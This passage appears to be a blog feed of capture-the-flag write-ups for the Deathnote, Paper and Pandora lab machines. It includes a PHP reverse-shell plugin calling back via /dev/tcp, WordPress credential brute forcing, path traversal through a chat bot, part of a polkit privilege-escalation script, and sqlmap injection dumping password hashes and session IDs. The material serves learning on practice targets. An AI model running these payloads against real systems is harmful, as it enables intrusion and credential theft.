codeview-source:http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/ wget http:&#x2F;&#x2F;deathnote.vuln&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;2021&#x2F;07&#x2F;user.txt wget http:&#x2F;&#x2F;deathnote.vuln&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;2021&#x2F;07&#x2F;notes.txt So user is a list of username and notes should be a list of password. brute force wordpressecho &quot;iamjustic3&quot; &gt;&gt; user.txt echo &quot;iamjustic3&quot; &gt;&gt; notes.txt echo &quot;L&quot; &gt;&gt; user.txt echo &quot;L&quot; &gt;&gt; notes.txt wpscan --url http:&#x2F;&#x2F;192.168.0.27&#x2F;wordpress&#x2F; -U user.txt -P notes.txt [SUCCESS] - KIRA / iamjustic3[SUCCESS] - kira / iamjustic3Good, now I have to login and upload a revers shell in php. Upload the payload vim rs.php &lt;?php &#x2F;** * Plugin Name: Peanut&#39;s Revers Shell * Author: Peanutstick *&#x2F; exec(&quot;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.21&#x2F;4648 0&gt;&amp;1&#39;&quot;); ?&gt; zip -r rs.zip rs.php nc -lvp 4648 Now I can send the file, and activate it. EnumerationDownloading my scriptsOn my computer: python2.7 -m SimpleHTTPServer On the target mkdir sc cd sc wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lse.sh wget http:&#x2F;&#x2F;192.168.0.21:8000&#x2F;lp.sh chmod +x lse.sh lp.sh .&#x2F;lse.sh .&#x2F;lp.sh Nothing interesting with the lselp:Sound interesting ╔══════════╣ .sh files in path ╚ https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;linux-unix&#x2F;privilege-escalation#script-binaries-in-path &#x2F;usr&#x2F;bin&#x2F;gettext.sh Good ╔══════════╣ Analyzing SSH Files (limit 70) -rw-r--r-- 1 kira kira 393 Jul 19 2021 &#x2F;home&#x2F;kira&#x2F;.ssh&#x2F;authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3&#x2F;Jy93n0NfPqOX7HGkLBasYR0v&#x2F;IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj&#x2F;6vBi+wMyFF3jQhP4Su72ssLH1n&#x2F;E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k&#x2F;POyhURC6MW0V&#x2F;aQICFZ6z l@deathnote ChallengeResponseAuthentication no UsePAM yes Users: ╔══════════╣ Last time logon each user Username Port From Latest root tty1 Mon Jul 19 11:26:48 -0400 2021 l pts&#x2F;0 192.168.1.6 Sat Sep 4 06:12:29 -0400 2021 kira pts&#x2F;1 127.0.0.1 Sat Sep 4 06:00:09 -0400 2021 L homeIn the file user.txt www-data@deathnote:&#x2F;home&#x2F;l$ cat us* cat us* ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.&lt;&lt;++.&gt;&gt;+++++++++++.------------.+.+++++.---.&lt;&lt;.&gt;&gt;++++++++++.&lt;&lt;.&gt;&gt;--------------.++++++++.+++++.&lt;&lt;.&gt;&gt;.------------.---.&lt;&lt;.&gt;&gt;++++++++++++++.-----------.---.+++++++..&lt;&lt;.++++++++++++.------------.&gt;&gt;----------.+++++++++++++++++++.-.&lt;&lt;.&gt;&gt;+++++.----------.++++++.&lt;&lt;.&gt;&gt;++.--------.-.++++++.&lt;&lt;.&gt;&gt;------------------.+++.&lt;&lt;.&gt;&gt;----.+.++++++++++.-------.&lt;&lt;.&gt;&gt;+++++++++++++++.-----.&lt;&lt;.&gt;&gt;----.--.+++..&lt;&lt;.&gt;&gt;+.--------.&lt;&lt;.+++++++++++++.&gt;&gt;++++++.--.+++++++++.-----------------. Brainfucki think u got the shell , but you wont be able to kill me -kira let’s dive deeper. /opt/Lwww-data@deathnote:&#x2F;opt&#x2F;L&#x2F;fake-notebook-rule$ file case.wav file case.wav case.wav: ASCII text www-data@deathnote:&#x2F;opt&#x2F;L&#x2F;fake-notebook-rule$ cat case.wav cat case.wav 63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d https://www.convertstring.com/fr/EncodeDecode/HexDecodeAnd I got this: cGFzc3dkIDoga2lyYWlzZXZpbCA=https://www.base64decode.org/And I got this: “passwd : kiraisevil”kiraisevil I’ve tried this password with the ssh key and without, it’s not for the ssh. kirasu kirra Password: kiraisevil id uid&#x3D;1001(kira) gid&#x3D;1001(kira) groups&#x3D;1001(kira),27(sudo) Spawn a better shell python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; Read kira.txt cat &#x2F;home&#x2F;kira&#x2F;kira.txt cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp Oh no… I don’t like this.Nvm let’s be root $ sudo -l sudo -l [sudo] password for kira: kiraisevil Matching Defaults entries for kira on deathnote: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin User kira may run the following commands on deathnote: (ALL : ALL) ALL The basic sudo su.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Paper","slug":"CTF_Paper","date":"2022-02-06T03:07:56.000Z","updated":"2022-09-27T07:49:09.931Z","comments":true,"path":"/post/CTF_Paper.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Paper.html","excerpt":"","text":"/etc/hostsecho &quot;10.129.147.140 paper.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hosts rustscanrustscan -a paper.htb --range 1-65000 PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 443&#x2F;tcp open https syn-ack nmapnmap -sV -p 80,443,22 paper.htb PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.0 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.37 ((centos) OpenSSL&#x2F;1.1.1k mod_fcgid&#x2F;2.3.9) 443&#x2F;tcp open ssl&#x2F;http Apache httpd 2.4.37 ((centos) OpenSSL&#x2F;1.1.1k mod_fcgid&#x2F;2.3.9) Apache outdated. Directory listingwfuzz --sc 200 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;paper.htb&#x2F;FUZZ Nothing sub domain listingwfuzz -c -f sub-fighter -w Documents&#x2F;wordlist&#x2F;subdomains.lst -u &#39;http:&#x2F;&#x2F;paper.htb&#39; -H &quot;Host: FUZZ.paper.htb&quot; --sc 200 Nothing WebNothing in the source code.Powered by centOS and apache phpThis is good, maybe I can read php files in this server nmapgobustergobuster dir -t 100 -x php -u http:&#x2F;&#x2F;paper.htb -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt /manual (Status: 301) [Size: 232] [–&gt; http://paper.htb/manual/] gobuster dir -t 100 -x php -u http:&#x2F;&#x2F;paper.htb&#x2F;manual -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt /misc (Status: 301) [Size: 237] [–&gt; http://paper.htb/manual/misc/]/images (Status: 301) [Size: 239] [–&gt; http://paper.htb/manual/images/]/faq (Status: 301) [Size: 236] [–&gt; http://paper.htb/manual/faq/]/programs (Status: 301) [Size: 241] [–&gt; http://paper.htb/manual/programs/]/howto (Status: 301) [Size: 238] [–&gt; http://paper.htb/manual/howto/]/developer (Status: 301) [Size: 242] [–&gt; http://paper.htb/manual/developer/]/style (Status: 301) [Size: 238] [–&gt; http://paper.htb/manual/style/]/ssl (Status: 301) [Size: 236] [–&gt; http://paper.htb/manual/ssl/]/platform (Status: 301) [Size: 241] [–&gt; http://paper.htb/manual/platform/]/mod (Status: 301) [Size: 236] [–&gt; http://paper.htb/manual/mod/]/LICENSE (Status: 200) [Size: 11358]/vhosts (Status: 301) [Size: 239] [–&gt; http://paper.htb/manual/vhosts/]/rewrite (Status: 301) [Size: 240] [–&gt; http://paper.htb/manual/rewrite/]/BUILDING (Status: 200) [Size: 102] Nothing interesting telnettelnet paper.htb 80 Trying 10.129.147.140…Connected to paper.htb.Escape character is ‘^]’.GET /../../../../../../../../../../../../../../../../../../../etc/apache2/apach2.conf HTTP/1.1 HTTP/1.1 400 Bad RequestDate: Sat, 05 Feb 2022 21:39:40 GMTServer: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9X-Backend-Server: office.paperContent-Length: 226Connection: closeContent-Type: text/html; charset=iso-8859-1 So we have office.paper, I’m gonna add it to my /etc/hosts Yesss!!!!! gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;office.paper -w Documents&#x2F;wordlist&#x2F;directory-list-medium.txt /wp-content (Status: 301) [Size: 239] [–&gt; http://office.paper/wp-content/]/manual (Status: 301) [Size: 235] [–&gt; http://office.paper/manual/]/wp-includes (Status: 301) [Size: 240] [–&gt; http://office.paper/wp-includes/]/wp-admin (Status: 301) [Size: 237] [–&gt; http://office.paper/wp-admin/] It will be easy, it’s a workpress weebsite. And we have some potentiel user:prisonmikeJanMichaelNick There is only one WP user. wpscanwpscan -e u vp vt dbe --url http:&#x2F;&#x2F;office.paper The readme still here: http://office.paper/readme.htmlWordPress version 5.2.3 identified (Insecure, released on 2019-09-05).http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1We have 2 wp users:nick and prisonmike WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Postshttps://wpscan.com/vulnerability/9909Proof of Concept for “Wordpress &lt;=5.2.3: viewing unauthenticated posts” (CVE-2019-17671)https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/ http://office.paper/?static=1 test Micheal please remove the secret from drafts for gods sake! Hello employees of Blunder Tiffin, Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system. So, I kindly request you all to take your discussions from the public blog to a more private chat system. -Nick # Warning for Michael Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick Threat Level Midnight A MOTION PICTURE SCREENPLAY, WRITTEN AND DIRECTED BY MICHAEL SCOTT [INT:DAY] Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt…. # Secret Registration URL of new Employee chat system http:&#x2F;&#x2F;chat.office.paper&#x2F;register&#x2F;8qozr226AhkCHZdyY # I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick. # Also, stop looking at my drafts. Jeez! I have an another link, I have to add chat.office.paper to my hosts file.http://chat.office.paper/register/8qozr226AhkCHZdyY rocket chatThis CTF is so fun :DNOOO, GOD! NO, GOD, PLEASE, NO! NO! NO!I have something to do with the bot. I can’t upload files in the chat with the bot.This is interesting. recyclops list sale -rw-r–r– 1 dwight dwight 158 Sep 15 13:03 portfolio.txt recyclops list ..&#x2F;..&#x2F;..&#x2F;home&#x2F; total 0drwxr-xr-x. 3 root root 20 Jan 14 06:50 .dr-xr-xr-x. 17 root root 244 Jan 17 11:37 ..drwx—— 11 dwight dwight 294 Feb 5 14:46 dwight Maybe I can start an another command with ;Ahahahah!!!!Stop injecting OS commands! Maybe I can fetch the wp-config.php3. Files:eg: ‘recyclops get me the file test.txt’, or ‘recyclops could you send me the file src/test.php’ or just ‘recyclops file test.txt’ Get userrecyclops file ../../../home/dwight/hubot/.envexport ROCKETCHAT_PASSWORD=Queenofblad3s!23 I have to try this password with the user of the box.recyclops list ../../../home/total 8drwxr-xr-x. 3 root root 20 Jan 14 06:50 .dr-xr-xr-x. 17 root root 244 Jan 17 11:37 ..drwx—— 13 dwight dwight 4096 Feb 6 04:10 dwight ssh dwight@paper.htb get rootIn the dwight home we have a pk.sh file. #!&#x2F;bin&#x2F;bash # Set the name and display name userName&#x3D;&quot;hacked&quot; realName&#x3D;&quot;hacked&quot; # Set the account as an administrator accountType&#x3D;1 # Set the password hash for &#39;password&#39; and password hint password&#x3D;&#39;$5$WR3c6uwMGQZ&#x2F;JEZw$OlBVzagNJswkWrKRSuoh&#x2F;VCrZv183QpZL7sAeskcoTB&#39; passHint&#x3D;&quot;password&quot; # Check Polkit version polkitVersion&#x3D;$(systemctl status polkit.service | grep version | cut -d &quot; &quot; -f 9) if [[ &quot;$(apt list --installed 2&gt;&#x2F;dev&#x2F;null | grep polkit | grep -c 0.105-26)&quot; -ge 1 || &quot;$(yum list installed | grep polkit | grep -c 0.117-2)&quot; ]]; then echo &quot;[*] Vulnerable version of polkit found&quot; else echo &quot;[!] WARNING: Version of polkit might not vulnerable&quot; fi It will create a new user, hacked:password.He is checking the version of polkit too.I don’t put all the code, it’s too long, you have to see it yourself. .&#x2F;pk.sh Oh!!! pk is for polkit I got it now, but I don’t know why my pol.py don’t work, I’m using this exploit too. It was a cool box, I was a bit stuck at the beginning because I didn’t saw office.paper.htbThe bot was fun, you can do it in some python or bash bots on discord or IRC.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Pandora","slug":"CTF_Pandora","date":"2022-02-05T00:30:52.000Z","updated":"2022-09-27T07:49:11.124Z","comments":true,"path":"/post/CTF_Pandora.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Pandora.html","excerpt":"","text":"/etc/hosts10.10.11.136 pandora.htb nmapnmap -sV -p- 10.10.11.136 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel wfuzzwfuzz --sc 200 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;pandora.htb&#x2F;FUZZ Nothing, same for the subdoimains. nmap n°2sudo nmap -sU --min-rate 100 pandora.htb PORT STATE SERVICE 161&#x2F;udp open snmp 19283&#x2F;udp closed keysrvr let’s see what we can do with snmp Matasploitmsfconsole use auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enum show options set rhost 10.10.11.136 This is so cool, I can see every process, there is lot off hackers in the box. /usr/bin/host_check -u daniel -p HotelBabylon23 sshssh daniel@pandora.htb lseon My computer in my script directory python2.7 -m SimpleHTTPServer on the target wget http:&#x2F;&#x2F;10.10.15.22:8000&#x2F;lse.sh chmod +x lse.sh .&#x2F;lse.sh &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] fst000 Writable files outside user&#39;s home.............................. yes! [*] fst010 Binaries with setuid bit........................................ yes! [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;usr&#x2F;bin&#x2F;pandora_backup --- pownkit root 960 0.0 0.2 236420 8932 ? Ssl 10:00 0:00 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkitd --no-debug I have to resist!!! pandora_backupI have to pwn matt first. linPEAShttps://github.com/carlospolop/PEASS-ng/tree/master/linPEASI’m not supposed to use this exploit…I can do it to get the frre flags but it’m not a cheater. I have other open ports. Interesting filesMysql user: mysqlnmap -sV -p- 127.0.0.1 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) 3306&#x2F;tcp open mysql MySQL 5.5.5-10.3.32-MariaDB-0ubuntu0.20.04.1 I don’t have the creds webI wanted to browse pandora.panda.htb:it’s in my /etc/hosts but it’s not working, so tryed to do it via ssh with curl. curl pandora.panda.htb Same problem, let’s see his /etc/hosts daniel@pandora:&#x2F;tmp&#x2F;dir$ cat &#x2F;etc&#x2F;hosts 127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb 127.0.1.1 pandora 127.0.0.1 pandora is the website I saw on the port 80,I think 127.0.0.1 work only on localhost. daniel@pandora:&#x2F;tmp&#x2F;dir$ curl pandora.pandora.htb &lt;meta HTTP-EQUIV&#x3D;&quot;REFRESH&quot; content&#x3D;&quot;0; url&#x3D;&#x2F;pandora_console&#x2F;&quot;&gt; Yesss!!!!Now I have to find a way to se in on my browser. Web tunnelinghttps://www.it-connect.fr/chapitres/tunneling-ssh/It’s french but it’s good! ssh -f daniel@pandora.htb -L 2500:localhost:80 -N Boom! Where is the password… what is the username…(╯°□°）╯︵ ┻━┻)Oh no I have to be fast. Connnect with danielI was trying to connect with daniel.Ihave this error:It’s good, I have to use the API. Browsing the filesIn /var/www/pandora/pandora_console cat pandoradb.sql |grep pass `plugin_pass` text, `password` varchar(45) default '', `password` text, `snmp_auth_pass` varchar(255) NOT NULL default '', `snmp_privacy_pass` varchar(255) NOT NULL default '', `plugin_pass` text, `password` varchar(45) default NULL, `force_change_pass` tinyint(1) unsigned NOT NULL default 0, `last_pass_change` DATETIME NOT NULL DEFAULT 0, `ehorus_user_level_pass` VARCHAR(45), -- Table `treset_pass_history` CREATE TABLE IF NOT EXISTS `treset_pass_history` ( -- \"pass_opt\" are deprecated for the 5.1. `pass_opt` varchar(50) default '', `pass` varchar(100) NOT NULL default '', `is_password_type` tinyint(1) NOT NULL default 0, -- Table `tpassword_history` CREATE TABLE IF NOT EXISTS `tpassword_history` ( `id_pass` int(10) unsigned NOT NULL auto_increment, `password` varchar(45) default NULL, PRIMARY KEY (`id_pass`) `plugin_pass` text default '', `password` varchar(100) default '', `password` varchar(100) default '', `dbpass` text, `meta_dbpass` text, `api_password` text NOT NULL, CREATE TABLE IF NOT EXISTS `treset_pass` ( cat DB_Dockerfile FROM mysql:5.5 MAINTAINER Pandora FMS Team &lt;info@pandorafms.com&gt; WORKDIR &#x2F;pandorafms&#x2F;pandora_console ADD pandoradb.sql &#x2F;docker-entrypoint-initdb.d ADD pandoradb_data.sql &#x2F;docker-entrypoint-initdb.d RUN chown mysql &#x2F;docker-entrypoint-initdb.d ENV MYSQL_DATABASE&#x3D;pandora RUN echo &quot; \\n\\ sed -i \\&quot;1iUSE \\$MYSQL_DATABASE\\&quot; &#x2F;docker-entrypoint-initdb.d&#x2F;pandoradb.sql \\n\\ sed -i \\&quot;1iUSE \\$MYSQL_DATABASE\\&quot; &#x2F;docker-entrypoint-initdb.d&#x2F;pandoradb_data.sql \\n\\ &quot; &gt;&gt; &#x2F;docker-entrypoint-initdb.d&#x2F;create_pandoradb.sh Dbmane=”pandora”Table=”tpassword_history”This website show where we can exploit.https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained sqlmapI don’t use sqlmap very often, that’s why I had lot of trouble. sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php&quot; -D pandora [20:44:13] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter &#39;id&#39; in &#39;www.site.com&#x2F;index.php?id&#x3D;1&#39;). You are advised to rerun with &#39;--crawl&#x3D;2&#39; sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?id&#x3D;&#39;&#39;&quot; -D pandora --tables [20:45:33] [WARNING] GET parameter &#39;id&#39; does not seem to be injectable Now I have to find out what I have to use instead if ‘id’. sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora [20:47:42] [WARNING] potential permission problems detected (&#39;Access denied&#39;) I have an another error, it’s good.This is a cheat sheet:https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora -T tpassword_history --dump +---------+---------+---------------------+----------------------------------+---------------------+ | id_pass | id_user | date_end | password | date_begin | +---------+---------+---------------------+----------------------------------+---------------------+ | 1 | matt | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 | | 2 | daniel | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 | +---------+---------+---------------------+----------------------------------+---------------------+ list of tablessqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora --tables [178 tables] +------------------------------------+ | taddress | | taddress_agent | | tagent_access | | tagent_custom_data | | tagent_custom_fields | | tagent_custom_fields_filter | | tagent_module_inventory | | tagent_module_log | | tagent_repository | | tagent_secondary_group | | tagente | | tagente_datos | | tagente_datos_inc | | tagente_datos_inventory | | tagente_datos_log4x | | tagente_datos_string | | tagente_estado | | tagente_modulo | | talert_actions | | talert_commands | | talert_snmp | | talert_snmp_action | | talert_special_days | | talert_template_module_actions | | talert_template_modules | | talert_templates | | tattachment | | tautoconfig | | tautoconfig_actions | | tautoconfig_rules | | tcategory | | tcluster | | tcluster_agent | | tcluster_item | | tcollection | | tconfig | | tconfig_os | | tcontainer | | tcontainer_item | | tcredential_store | | tdashboard | | tdatabase | | tdeployment_hosts | | tevent_alert | | tevent_alert_action | | tevent_custom_field | | tevent_extended | | tevent_filter | | tevent_response | | tevent_rule | | tevento | | textension_translate_string | | tfiles_repo | | tfiles_repo_group | | tgis_data_history | | tgis_data_status | | tgis_map | | tgis_map_connection | | tgis_map_has_tgis_map_con | | tgis_map_layer | | tgis_map_layer_groups | | tgis_map_layer_has_tagente | | tgraph | | tgraph_source | | tgraph_source_template | | tgraph_template | | tgroup_stat | | tgrupo | | tincidencia | | titem | | tlanguage | | tlayout | | tlayout_data | | tlayout_template | | tlayout_template_data | | tlink | | tlocal_component | | tlog_graph_models | | tmap | | tmensajes | | tmetaconsole_agent | | tmetaconsole_agent_secondary_group | | tmetaconsole_event | | tmetaconsole_event_history | | tmetaconsole_setup | | tmigration_module_queue | | tmigration_queue | | tmodule | | tmodule_group | | tmodule_inventory | | tmodule_relationship | | tmodule_synth | | tnetflow_filter | | tnetflow_report | | tnetflow_report_content | | tnetwork_component | | tnetwork_component_group | | tnetwork_map | | tnetwork_matrix | | tnetwork_profile | | tnetwork_profile_component | | tnetworkmap_ent_rel_nodes | | tnetworkmap_enterprise | | tnetworkmap_enterprise_nodes | | tnews | | tnota | | tnotification_group | | tnotification_source | | tnotification_source_group | | tnotification_source_group_user | | tnotification_source_user | | tnotification_user | | torigen | | tpassword_history | | tperfil | | tphase | | tplanned_downtime | | tplanned_downtime_agents | | tplanned_downtime_modules | | tplugin | | tpolicies | | tpolicy_agents | | tpolicy_alerts | | tpolicy_alerts_actions | | tpolicy_collections | | tpolicy_groups | | tpolicy_modules | | tpolicy_modules_inventory | | tpolicy_plugins | | tpolicy_queue | | tprofile_view | | tprovisioning | | tprovisioning_rules | | trecon_script | | trecon_task | | trel_item | | tremote_command | | tremote_command_target | | treport | | treport_content | | treport_content_item | | treport_content_item_temp | | treport_content_sla_com_temp | | treport_content_sla_combined | | treport_content_template | | treport_custom_sql | | treport_template | | treset_pass | | treset_pass_history | | tserver | | tserver_export | | tserver_export_data | | tservice | | tservice_element | | tsesion | | tsesion_extended | | tsessions_php | | tskin | | tsnmp_filter | | ttag | | ttag_module | | ttag_policy_module | | ttipo_modulo | | ttransaction | | ttrap | | ttrap_custom_values | | tupdate | | tupdate_journal | | tupdate_package | | tupdate_settings | | tuser_double_auth | | tuser_task | | tuser_task_scheduled | | tusuario | | tusuario_perfil | | tvisual_console_elements_cache | | twidget | | twidget_dashboard | +------------------------------------+ sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora -T tsessions_php --dump +----------------------------+------------------------------------------------------+-------------+ | id_session | data | last_active | +----------------------------+------------------------------------------------------+-------------+ | 07ou61d2jsi3087a9jg12s3m1k | NULL | 1644502695 | | 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:&quot;daniel&quot;; | 1638783555 | | 0ahul7feb1l9db7ffp8d25sjba | NULL | 1638789018 | | 1t2n71opaqeoausmhaqk277c21 | id_usuario|s:6:&quot;daniel&quot;; | 1644502477 | | 1um23if7s531kqf5da14kf5lvm | NULL | 1638792211 | | 2e25c62vc3odbppmg6pjbf9bum | NULL | 1638786129 | | 346uqacafar8pipuppubqet7ut | id_usuario|s:6:&quot;daniel&quot;; | 1638540332 | | 3fq6hl9r8kbadgq6r5bfjmojm5 | NULL | 1644502325 | | 3me2jjab4atfa5f8106iklh4fc | NULL | 1638795380 | | 4f51mju7kcuonuqor3876n8o02 | NULL | 1638786842 | | 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:&quot;daniel&quot;; | 1638535373 | | 59qae699l0971h13qmbpqahlls | NULL | 1638787305 | | 5fihkihbip2jioll1a8mcsmp6j | NULL | 1638792685 | | 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:&quot;daniel&quot;; | 1638281946 | | 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:&quot;daniel&quot;; | 1641195617 | | 81f3uet7p3esgiq02d4cjj48rc | NULL | 1623957150 | | 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:&quot;daniel&quot;; | 1638446321 | | 8uiokruc91od5tphgekpsau4lp | alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1644502812 | | 8upeameujo9nhki3ps0fu32cgd | NULL | 1638787267 | | 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:&quot;daniel&quot;; | 1638881787 | | a3a49kc938u7od6e6mlip1ej80 | NULL | 1638795315 | | agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:&quot;daniel&quot;; | 1638881664 | | cojb6rgubs18ipb35b3f6hf0vp | NULL | 1638787213 | | d0carbrks2lvmb90ergj7jv6po | NULL | 1638786277 | | d0h8gpqrh99ur3pfcb53vqak5e | NULL | 1644513572 | | elks2rkjdnk8f001jqbkinael0 | NULL | 1644513405 | | eqsc2gjr37g0ug1q4qdk3rabh4 | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1644502437 | | f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:&quot;daniel&quot;; | 1641200284 | | fikt9p6i78no7aofn74rr71m85 | NULL | 1638786504 | | fqd96rcv4ecuqs409n5qsleufi | NULL | 1638786762 | | g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:&quot;daniel&quot;; | 1638783230 | | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1644512890 | | gf40pukfdinc63nm5lkroidde6 | NULL | 1638786349 | | h1ge39342hcid93s3ghk0nhl3c | NULL | 1644502501 | | heasjj8c48ikjlvsf1uhonfesv | NULL | 1638540345 | | hif1pavjlks18e7oqgu8bmvhis | NULL | 1644513371 | | hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:&quot;daniel&quot;; | 1638168492 | | j85l7a3q010b3ul6sv2eh6amo6 | NULL | 1644502455 | | jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:&quot;daniel&quot;; | 1638456173 | | kp90bu1mlclbaenaljem590ik3 | NULL | 1638787808 | | ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL | 1638796348 | | o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:&quot;daniel&quot;; | 1638540482 | | oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:&quot;daniel&quot;; | 1637667827 | | pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:&quot;daniel&quot;; | 1638168416 | | qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL | 1638787723 | | r097jr6k9s7k166vkvaj17na1u | NULL | 1638787677 | | rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:&quot;daniel&quot;; | 1638889082 | | u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:&quot;daniel&quot;; | 1638547193 | | u74bvn6gop4rl21ds325q80j0e | 